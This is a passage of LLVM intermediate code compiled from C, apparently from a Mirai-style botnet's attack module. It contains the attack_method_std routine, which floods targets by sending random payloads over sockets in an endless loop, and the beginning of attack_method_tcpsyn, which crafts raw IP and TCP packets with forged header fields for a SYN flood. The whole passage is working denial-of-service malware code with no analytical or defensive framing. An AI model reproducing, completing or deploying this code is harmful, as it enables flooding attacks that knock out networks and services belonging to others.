  store i16 %428, i16* %430, align 2
  %431 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %432 = load i32, i32* %9, align 4
  %433 = sext i32 %432 to i64
  %434 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %431, i64 %433
  %435 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %434, i32 0, i32 0
  %436 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %435, i32 0, i32 0
  store i16 2, i16* %436, align 4
  %437 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %438 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %437, i32 0, i32 9
  %439 = load i32, i32* %438, align 4
  %440 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %441 = load i32, i32* %9, align 4
  %442 = sext i32 %441 to i64
  %443 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %440, i64 %442
  %444 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %443, i32 0, i32 0
  %445 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %444, i32 0, i32 2
  %446 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %445, i32 0, i32 0
  store i32 %439, i32* %446, align 4
  %447 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %448 = load i32, i32* %9, align 4
  %449 = sext i32 %448 to i64
  %450 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %447, i64 %449
  %451 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %450, i32 0, i32 0
  %452 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %451, i32 0, i32 1
  store i16 0, i16* %452, align 2
  %453 = load i32, i32* %10, align 4
  %454 = load i8*, i8** %30, align 8
  %455 = load i32, i32* %18, align 4
  %456 = sext i32 %455 to i64
  %457 = add i64 66, %456
  %458 = bitcast %union.__CONST_SOCKADDR_ARG* %40 to %struct.sockaddr**
  %459 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %460 = load i32, i32* %9, align 4
  %461 = sext i32 %460 to i64
  %462 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %459, i64 %461
  %463 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %462, i32 0, i32 0
  %464 = bitcast %struct.sockaddr_in* %463 to %struct.sockaddr*
  store %struct.sockaddr* %464, %struct.sockaddr** %458, align 8
  %465 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %40, i32 0, i32 0
  %466 = load %struct.sockaddr*, %struct.sockaddr** %465, align 8
  %467 = call i64 @sendto(i32 noundef %453, i8* noundef %454, i64 noundef %457, i32 noundef 16384, %struct.sockaddr* %466, i32 noundef 16)
  br label %468

468:                                              ; preds = %401
  %469 = load i32, i32* %9, align 4
  %470 = add nsw i32 %469, 1
  store i32 %470, i32* %9, align 4
  br label %257, !llvm.loop !16

471:                                              ; preds = %257
  br label %256

472:                                              ; preds = %92, %86
  ret void
}

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local void @attack_method_std(i8 noundef zeroext %0, %struct.attack_target* noundef %1, i8 noundef zeroext %2, %struct.attack_option* noundef %3) #0 {
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i8**, align 8
  %11 = alloca i32*, align 8
  %12 = alloca i16, align 2
  %13 = alloca i16, align 2
  %14 = alloca i16, align 2
  %15 = alloca i8, align 1
  %16 = alloca %struct.sockaddr_in, align 4
  %17 = alloca %struct.iphdr*, align 8
  %18 = alloca %struct.udphdr*, align 8
  %19 = alloca i8*, align 8
  %20 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %21 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %22 = alloca i8*, align 8
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %23 = load i8, i8* %5, align 1
  %24 = zext i8 %23 to i64
  %25 = call noalias i8* @calloc(i64 noundef %24, i64 noundef 8) #7
  %26 = bitcast i8* %25 to i8**
  store i8** %26, i8*** %10, align 8
  %27 = load i8, i8* %5, align 1
  %28 = zext i8 %27 to i64
  %29 = call noalias i8* @calloc(i64 noundef %28, i64 noundef 4) #7
  %30 = bitcast i8* %29 to i32*
  store i32* %30, i32** %11, align 8
  %31 = load i8, i8* %7, align 1
  %32 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %33 = call i32 @attack_get_opt_int(i8 noundef zeroext %31, %struct.attack_option* noundef %32, i8 noundef zeroext 7, i32 noundef 65535)
  %34 = trunc i32 %33 to i16
  store i16 %34, i16* %12, align 2
  %35 = load i8, i8* %7, align 1
  %36 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %37 = call i32 @attack_get_opt_int(i8 noundef zeroext %35, %struct.attack_option* noundef %36, i8 noundef zeroext 6, i32 noundef 65535)
  %38 = trunc i32 %37 to i16
  store i16 %38, i16* %13, align 2
  %39 = load i8, i8* %7, align 1
  %40 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %41 = call i32 @attack_get_opt_int(i8 noundef zeroext %39, %struct.attack_option* noundef %40, i8 noundef zeroext 0, i32 noundef 1024)
  %42 = trunc i32 %41 to i16
  store i16 %42, i16* %14, align 2
  %43 = load i8, i8* %7, align 1
  %44 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %45 = call i32 @attack_get_opt_int(i8 noundef zeroext %43, %struct.attack_option* noundef %44, i8 noundef zeroext 1, i32 noundef 1)
  %46 = trunc i32 %45 to i8
  store i8 %46, i8* %15, align 1
  %47 = bitcast %struct.sockaddr_in* %16 to i8*
  call void @llvm.memset.p0i8.i64(i8* align 4 %47, i8 0, i64 16, i1 false)
  %48 = load i16, i16* %13, align 2
  %49 = zext i16 %48 to i32
  %50 = icmp eq i32 %49, 65535
  br i1 %50, label %51, label %54

51:                                               ; preds = %4
  %52 = call i32 @rand_next()
  %53 = trunc i32 %52 to i16
  store i16 %53, i16* %13, align 2
  br label %57

54:                                               ; preds = %4
  %55 = load i16, i16* %13, align 2
  %56 = call zeroext i16 @htons(i16 noundef zeroext %55) #8
  store i16 %56, i16* %13, align 2
  br label %57

57:                                               ; preds = %54, %51
  store i32 0, i32* %9, align 4
  br label %58

58:                                               ; preds = %170, %57
  %59 = load i32, i32* %9, align 4
  %60 = load i8, i8* %5, align 1
  %61 = zext i8 %60 to i32
  %62 = icmp slt i32 %59, %61
  br i1 %62, label %63, label %173

63:                                               ; preds = %58
  %64 = call noalias i8* @calloc(i64 noundef 65535, i64 noundef 1) #7
  %65 = load i8**, i8*** %10, align 8
  %66 = load i32, i32* %9, align 4
  %67 = sext i32 %66 to i64
  %68 = getelementptr inbounds i8*, i8** %65, i64 %67
  store i8* %64, i8** %68, align 8
  %69 = load i16, i16* %12, align 2
  %70 = zext i16 %69 to i32
  %71 = icmp eq i32 %70, 65535
  br i1 %71, label %72, label %81

72:                                               ; preds = %63
  %73 = call i32 @rand_next()
  %74 = trunc i32 %73 to i16
  %75 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %76 = load i32, i32* %9, align 4
  %77 = sext i32 %76 to i64
  %78 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %75, i64 %77
  %79 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %78, i32 0, i32 0
  %80 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %79, i32 0, i32 1
  store i16 %74, i16* %80, align 2
  br label %90

81:                                               ; preds = %63
  %82 = load i16, i16* %12, align 2
  %83 = call zeroext i16 @htons(i16 noundef zeroext %82) #8
  %84 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %85 = load i32, i32* %9, align 4
  %86 = sext i32 %85 to i64
  %87 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %84, i64 %86
  %88 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %87, i32 0, i32 0
  %89 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %88, i32 0, i32 1
  store i16 %83, i16* %89, align 2
  br label %90

90:                                               ; preds = %81, %72
  %91 = call i32 @socket(i32 noundef 2, i32 noundef 2, i32 noundef 0) #7
  %92 = load i32*, i32** %11, align 8
  %93 = load i32, i32* %9, align 4
  %94 = sext i32 %93 to i64
  %95 = getelementptr inbounds i32, i32* %92, i64 %94
  store i32 %91, i32* %95, align 4
  %96 = icmp eq i32 %91, -1
  br i1 %96, label %97, label %98

97:                                               ; preds = %90
  ret void

98:                                               ; preds = %90
  %99 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 0
  store i16 2, i16* %99, align 4
  %100 = load i16, i16* %13, align 2
  %101 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 1
  store i16 %100, i16* %101, align 2
  %102 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 2
  %103 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %102, i32 0, i32 0
  store i32 0, i32* %103, align 4
  %104 = load i32*, i32** %11, align 8
  %105 = load i32, i32* %9, align 4
  %106 = sext i32 %105 to i64
  %107 = getelementptr inbounds i32, i32* %104, i64 %106
  %108 = load i32, i32* %107, align 4
  %109 = bitcast %union.__CONST_SOCKADDR_ARG* %20 to %struct.sockaddr**
  %110 = bitcast %struct.sockaddr_in* %16 to %struct.sockaddr*
  store %struct.sockaddr* %110, %struct.sockaddr** %109, align 8
  %111 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %20, i32 0, i32 0
  %112 = load %struct.sockaddr*, %struct.sockaddr** %111, align 8
  %113 = call i32 @bind(i32 noundef %108, %struct.sockaddr* %112, i32 noundef 16) #7
  %114 = icmp eq i32 %113, -1
  br i1 %114, label %115, label %116

115:                                              ; preds = %98
  br label %116

116:                                              ; preds = %115, %98
  %117 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %118 = load i32, i32* %9, align 4
  %119 = sext i32 %118 to i64
  %120 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %117, i64 %119
  %121 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %120, i32 0, i32 2
  %122 = load i8, i8* %121, align 4
  %123 = zext i8 %122 to i32
  %124 = icmp slt i32 %123, 32
  br i1 %124, label %125, label %151

125:                                              ; preds = %116
  %126 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %127 = load i32, i32* %9, align 4
  %128 = sext i32 %127 to i64
  %129 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %126, i64 %128
  %130 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %129, i32 0, i32 1
  %131 = load i32, i32* %130, align 4
  %132 = call i32 @ntohl(i32 noundef %131) #8
  %133 = call i32 @rand_next()
  %134 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %135 = load i32, i32* %9, align 4
  %136 = sext i32 %135 to i64
  %137 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %134, i64 %136
  %138 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %137, i32 0, i32 2
  %139 = load i8, i8* %138, align 4
  %140 = zext i8 %139 to i32
  %141 = lshr i32 %133, %140
  %142 = add i32 %132, %141
  %143 = call i32 @htonl(i32 noundef %142) #8
  %144 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %145 = load i32, i32* %9, align 4
  %146 = sext i32 %145 to i64
  %147 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %144, i64 %146
  %148 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %147, i32 0, i32 0
  %149 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %148, i32 0, i32 2
  %150 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %149, i32 0, i32 0
  store i32 %143, i32* %150, align 4
  br label %151

151:                                              ; preds = %125, %116
  %152 = load i32*, i32** %11, align 8
  %153 = load i32, i32* %9, align 4
  %154 = sext i32 %153 to i64
  %155 = getelementptr inbounds i32, i32* %152, i64 %154
  %156 = load i32, i32* %155, align 4
  %157 = bitcast %union.__CONST_SOCKADDR_ARG* %21 to %struct.sockaddr**
  %158 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %159 = load i32, i32* %9, align 4
  %160 = sext i32 %159 to i64
  %161 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %158, i64 %160
  %162 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %161, i32 0, i32 0
  %163 = bitcast %struct.sockaddr_in* %162 to %struct.sockaddr*
  store %struct.sockaddr* %163, %struct.sockaddr** %157, align 8
  %164 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %21, i32 0, i32 0
  %165 = load %struct.sockaddr*, %struct.sockaddr** %164, align 8
  %166 = call i32 @connect(i32 noundef %156, %struct.sockaddr* %165, i32 noundef 16)
  %167 = icmp eq i32 %166, -1
  br i1 %167, label %168, label %169

168:                                              ; preds = %151
  br label %169

169:                                              ; preds = %168, %151
  br label %170

170:                                              ; preds = %169
  %171 = load i32, i32* %9, align 4
  %172 = add nsw i32 %171, 1
  store i32 %172, i32* %9, align 4
  br label %58, !llvm.loop !17

173:                                              ; preds = %58
  br label %174

174:                                              ; preds = %205, %173
  store i32 0, i32* %9, align 4
  br label %175

175:                                              ; preds = %202, %174
  %176 = load i32, i32* %9, align 4
  %177 = load i8, i8* %5, align 1
  %178 = zext i8 %177 to i32
  %179 = icmp slt i32 %176, %178
  br i1 %179, label %180, label %205

180:                                              ; preds = %175
  %181 = load i8**, i8*** %10, align 8
  %182 = load i32, i32* %9, align 4
  %183 = sext i32 %182 to i64
  %184 = getelementptr inbounds i8*, i8** %181, i64 %183
  %185 = load i8*, i8** %184, align 8
  store i8* %185, i8** %22, align 8
  %186 = load i8, i8* %15, align 1
  %187 = icmp ne i8 %186, 0
  br i1 %187, label %188, label %192

188:                                              ; preds = %180
  %189 = load i8*, i8** %22, align 8
  %190 = load i16, i16* %14, align 2
  %191 = zext i16 %190 to i32
  call void @rand_str(i8* noundef %189, i32 noundef %191)
  br label %192

192:                                              ; preds = %188, %180
  %193 = load i32*, i32** %11, align 8
  %194 = load i32, i32* %9, align 4
  %195 = sext i32 %194 to i64
  %196 = getelementptr inbounds i32, i32* %193, i64 %195
  %197 = load i32, i32* %196, align 4
  %198 = load i8*, i8** %22, align 8
  %199 = load i16, i16* %14, align 2
  %200 = zext i16 %199 to i64
  %201 = call i64 @send(i32 noundef %197, i8* noundef %198, i64 noundef %200, i32 noundef 16384)
  br label %202

202:                                              ; preds = %192
  %203 = load i32, i32* %9, align 4
  %204 = add nsw i32 %203, 1
  store i32 %204, i32* %9, align 4
  br label %175, !llvm.loop !18

205:                                              ; preds = %175
  br label %174
}

; Function Attrs: argmemonly nofree nounwind willreturn writeonly
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i1 immarg) #5

; Function Attrs: nounwind
declare i32 @bind(i32 noundef, %struct.sockaddr*, i32 noundef) #1

declare i32 @connect(i32 noundef, %struct.sockaddr*, i32 noundef) #4

declare i64 @send(i32 noundef, i8* noundef, i64 noundef, i32 noundef) #4

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local void @attack_method_tcpsyn(i8 noundef zeroext %0, %struct.attack_target* noundef %1, i8 noundef zeroext %2, %struct.attack_option* noundef %3) #0 {
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8**, align 8
  %12 = alloca i8, align 1
  %13 = alloca i16, align 2
  %14 = alloca i8, align 1
  %15 = alloca i8, align 1
  %16 = alloca i16, align 2
  %17 = alloca i16, align 2
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i8, align 1
  %21 = alloca i8, align 1
  %22 = alloca i8, align 1
  %23 = alloca i8, align 1
  %24 = alloca i8, align 1
  %25 = alloca i8, align 1
  %26 = alloca i32, align 4
  %27 = alloca %struct.iphdr*, align 8
  %28 = alloca %struct.tcphdr*, align 8
  %29 = alloca i8*, align 8
  %30 = alloca i8*, align 8
  %31 = alloca %struct.iphdr*, align 8
  %32 = alloca %struct.tcphdr*, align 8
  %33 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %34 = load i8, i8* %5, align 1
  %35 = zext i8 %34 to i64
  %36 = call noalias i8* @calloc(i64 noundef %35, i64 noundef 8) #7
  %37 = bitcast i8* %36 to i8**
  store i8** %37, i8*** %11, align 8
  %38 = load i8, i8* %7, align 1
  %39 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %40 = call i32 @attack_get_opt_int(i8 noundef zeroext %38, %struct.attack_option* noundef %39, i8 noundef zeroext 2, i32 noundef 0)
  %41 = trunc i32 %40 to i8
  store i8 %41, i8* %12, align 1
  %42 = load i8, i8* %7, align 1
  %43 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %44 = call i32 @attack_get_opt_int(i8 noundef zeroext %42, %struct.attack_option* noundef %43, i8 noundef zeroext 3, i32 noundef 65535)
  %45 = trunc i32 %44 to i16
  store i16 %45, i16* %13, align 2
  %46 = load i8, i8* %7, align 1
  %47 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %48 = call i32 @attack_get_opt_int(i8 noundef zeroext %46, %struct.attack_option* noundef %47, i8 noundef zeroext 4, i32 noundef 64)
  %49 = trunc i32 %48 to i8
  store i8 %49, i8* %14, align 1
  %50 = load i8, i8* %7, align 1
  %51 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %52 = call i32 @attack_get_opt_int(i8 noundef zeroext %50, %struct.attack_option* noundef %51, i8 noundef zeroext 5, i32 noundef 1)
  %53 = trunc i32 %52 to i8
  store i8 %53, i8* %15, align 1
  %54 = load i8, i8* %7, align 1
  %55 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %56 = call i32 @attack_get_opt_int(i8 noundef zeroext %54, %struct.attack_option* noundef %55, i8 noundef zeroext 6, i32 noundef 65535)
  %57 = trunc i32 %56 to i16
  store i16 %57, i16* %16, align 2
  %58 = load i8, i8* %7, align 1
  %59 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %60 = call i32 @attack_get_opt_int(i8 noundef zeroext %58, %struct.attack_option* noundef %59, i8 noundef zeroext 7, i32 noundef 65535)
  %61 = trunc i32 %60 to i16
  store i16 %61, i16* %17, align 2
  %62 = load i8, i8* %7, align 1
  %63 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %64 = call i32 @attack_get_opt_int(i8 noundef zeroext %62, %struct.attack_option* noundef %63, i8 noundef zeroext 17, i32 noundef 65535)
  store i32 %64, i32* %18, align 4
  %65 = load i8, i8* %7, align 1
  %66 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %67 = call i32 @attack_get_opt_int(i8 noundef zeroext %65, %struct.attack_option* noundef %66, i8 noundef zeroext 18, i32 noundef 0)
  store i32 %67, i32* %19, align 4
  %68 = load i8, i8* %7, align 1
  %69 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %70 = call i32 @attack_get_opt_int(i8 noundef zeroext %68, %struct.attack_option* noundef %69, i8 noundef zeroext 11, i32 noundef 0)
  %71 = trunc i32 %70 to i8
  store i8 %71, i8* %20, align 1
  %72 = load i8, i8* %7, align 1
  %73 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %74 = call i32 @attack_get_opt_int(i8 noundef zeroext %72, %struct.attack_option* noundef %73, i8 noundef zeroext 12, i32 noundef 0)
  %75 = trunc i32 %74 to i8
  store i8 %75, i8* %21, align 1
  %76 = load i8, i8* %7, align 1
  %77 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %78 = call i32 @attack_get_opt_int(i8 noundef zeroext %76, %struct.attack_option* noundef %77, i8 noundef zeroext 13, i32 noundef 0)
  %79 = trunc i32 %78 to i8
  store i8 %79, i8* %22, align 1
  %80 = load i8, i8* %7, align 1
  %81 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %82 = call i32 @attack_get_opt_int(i8 noundef zeroext %80, %struct.attack_option* noundef %81, i8 noundef zeroext 14, i32 noundef 0)
  %83 = trunc i32 %82 to i8
  store i8 %83, i8* %23, align 1
  %84 = load i8, i8* %7, align 1
  %85 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %86 = call i32 @attack_get_opt_int(i8 noundef zeroext %84, %struct.attack_option* noundef %85, i8 noundef zeroext 15, i32 noundef 1)
  %87 = trunc i32 %86 to i8
  store i8 %87, i8* %24, align 1
  %88 = load i8, i8* %7, align 1
  %89 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %90 = call i32 @attack_get_opt_int(i8 noundef zeroext %88, %struct.attack_option* noundef %89, i8 noundef zeroext 16, i32 noundef 0)
  %91 = trunc i32 %90 to i8
  store i8 %91, i8* %25, align 1
  %92 = load i8, i8* %7, align 1
  %93 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %94 = load i32, i32* @LOCAL_ADDR, align 4
  %95 = call i32 @attack_get_opt_ip(i8 noundef zeroext %92, %struct.attack_option* noundef %93, i8 noundef zeroext 25, i32 noundef %94)
  store i32 %95, i32* %26, align 4
  %96 = call i32 @socket(i32 noundef 2, i32 noundef 3, i32 noundef 6) #7
  store i32 %96, i32* %10, align 4
  %97 = icmp eq i32 %96, -1
  br i1 %97, label %98, label %99

98:                                               ; preds = %4
  br label %437

99:                                               ; preds = %4
  store i32 1, i32* %9, align 4
  %100 = load i32, i32* %10, align 4
  %101 = bitcast i32* %9 to i8*
  %102 = call i32 @setsockopt(i32 noundef %100, i32 noundef 0, i32 noundef 3, i8* noundef %101, i32 noundef 4) #7
  %103 = icmp eq i32 %102, -1
  br i1 %103, label %104, label %107

104:                                              ; preds = %99
  %105 = load i32, i32* %10, align 4
  %106 = call i32 @close(i32 noundef %105)
  br label %437

107:                                              ; preds = %99
  store i32 0, i32* %9, align 4
  br label %108

108:                                              ; preds = %285, %107
  %109 = load i32, i32* %9, align 4
  %110 = load i8, i8* %5, align 1
  %111 = zext i8 %110 to i32
  %112 = icmp slt i32 %109, %111
  br i1 %112, label %113, label %288

113:                                              ; preds = %108
  %114 = call noalias i8* @calloc(i64 noundef 128, i64 noundef 1) #7
  %115 = load i8**, i8*** %11, align 8
  %116 = load i32, i32* %9, align 4
  %117 = sext i32 %116 to i64
  %118 = getelementptr inbounds i8*, i8** %115, i64 %117
  store i8* %114, i8** %118, align 8
  %119 = load i8**, i8*** %11, align 8
  %120 = load i32, i32* %9, align 4
  %121 = sext i32 %120 to i64
  %122 = getelementptr inbounds i8*, i8** %119, i64 %121
  %123 = load i8*, i8** %122, align 8
  %124 = bitcast i8* %123 to %struct.iphdr*
  store %struct.iphdr* %124, %struct.iphdr** %27, align 8
  %125 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %126 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %125, i64 1
  %127 = bitcast %struct.iphdr* %126 to %struct.tcphdr*
  store %struct.tcphdr* %127, %struct.tcphdr** %28, align 8
  %128 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %129 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %128, i64 1
  %130 = bitcast %struct.tcphdr* %129 to i8*
  store i8* %130, i8** %29, align 8
  %131 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %132 = bitcast %struct.iphdr* %131 to i8*
  %133 = load i8, i8* %132, align 4
  %134 = and i8 %133, 15
  %135 = or i8 %134, 64
  store i8 %135, i8* %132, align 4
  %136 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %137 = bitcast %struct.iphdr* %136 to i8*
  %138 = load i8, i8* %137, align 4
  %139 = and i8 %138, -16
  %140 = or i8 %139, 5
  store i8 %140, i8* %137, align 4
  %141 = load i8, i8* %12, align 1
  %142 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %143 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %142, i32 0, i32 1
  store i8 %141, i8* %143, align 1
  %144 = call zeroext i16 @htons(i16 noundef zeroext 60) #8
  %145 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %146 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %145, i32 0, i32 2
  store i16 %144, i16* %146, align 2
  %147 = load i16, i16* %13, align 2
  %148 = call zeroext i16 @htons(i16 noundef zeroext %147) #8
  %149 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %150 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %149, i32 0, i32 3
  store i16 %148, i16* %150, align 4
  %151 = load i8, i8* %14, align 1
  %152 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %153 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %152, i32 0, i32 5
  store i8 %151, i8* %153, align 4
  %154 = load i8, i8* %15, align 1
  %155 = icmp ne i8 %154, 0
  br i1 %155, label %156, label %160

156:                                              ; preds = %113
  %157 = call zeroext i16 @htons(i16 noundef zeroext 16384) #8
  %158 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %159 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %158, i32 0, i32 4
  store i16 %157, i16* %159, align 2
  br label %160

160:                                              ; preds = %156, %113
  %161 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %162 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %161, i32 0, i32 6
  store i8 6, i8* %162, align 1
  %163 = load i32, i32* %26, align 4
  %164 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %165 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %164, i32 0, i32 8
  store i32 %163, i32* %165, align 4
  %166 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %167 = load i32, i32* %9, align 4
  %168 = sext i32 %167 to i64
  %169 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %166, i64 %168
  %170 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %169, i32 0, i32 1
  %171 = load i32, i32* %170, align 4
  %172 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %173 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %172, i32 0, i32 9
  store i32 %171, i32* %173, align 4
  %174 = load i16, i16* %16, align 2
  %175 = call zeroext i16 @htons(i16 noundef zeroext %174) #8
  %176 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %177 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %176, i32 0, i32 0
  store i16 %175, i16* %177, align 4
  %178 = load i16, i16* %17, align 2
  %179 = call zeroext i16 @htons(i16 noundef zeroext %178) #8
  %180 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %181 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %180, i32 0, i32 1
  store i16 %179, i16* %181, align 2
  %182 = load i32, i32* %18, align 4
  %183 = trunc i32 %182 to i16
  %184 = call zeroext i16 @htons(i16 noundef zeroext %183) #8
  %185 = zext i16 %184 to i32
  %186 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %187 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %186, i32 0, i32 2
  store i32 %185, i32* %187, align 4
  %188 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %189 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %188, i32 0, i32 4
  %190 = load i16, i16* %189, align 4
  %191 = and i16 %190, -241
  %192 = or i16 %191, 160
  store i16 %192, i16* %189, align 4
  %193 = load i8, i8* %20, align 1
  %194 = sext i8 %193 to i16
  %195 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %196 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %195, i32 0, i32 4
  %197 = load i16, i16* %196, align 4
  %198 = and i16 %194, 1
  %199 = shl i16 %198, 13
  %200 = and i16 %197, -8193
  %201 = or i16 %200, %199
  store i16 %201, i16* %196, align 4
  %202 = load i8, i8* %21, align 1
  %203 = sext i8 %202 to i16
  %204 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %205 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %204, i32 0, i32 4
  %206 = load i16, i16* %205, align 4
  %207 = and i16 %203, 1
  %208 = shl i16 %207, 12
  %209 = and i16 %206, -4097
  %210 = or i16 %209, %208
  store i16 %210, i16* %205, align 4
  %211 = load i8, i8* %22, align 1
  %212 = sext i8 %211 to i16
  %213 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %214 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %213, i32 0, i32 4
  %215 = load i16, i16* %214, align 4
  %216 = and i16 %212, 1
  %217 = shl i16 %216, 11
  %218 = and i16 %215, -2049
  %219 = or i16 %218, %217
  store i16 %219, i16* %214, align 4
  %220 = load i8, i8* %23, align 1
  %221 = sext i8 %220 to i16
  %222 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %223 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %222, i32 0, i32 4
  %224 = load i16, i16* %223, align 4
  %225 = and i16 %221, 1
  %226 = shl i16 %225, 10
  %227 = and i16 %224, -1025
  %228 = or i16 %227, %226
  store i16 %228, i16* %223, align 4
  %229 = load i8, i8* %24, align 1
  %230 = sext i8 %229 to i16
  %231 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
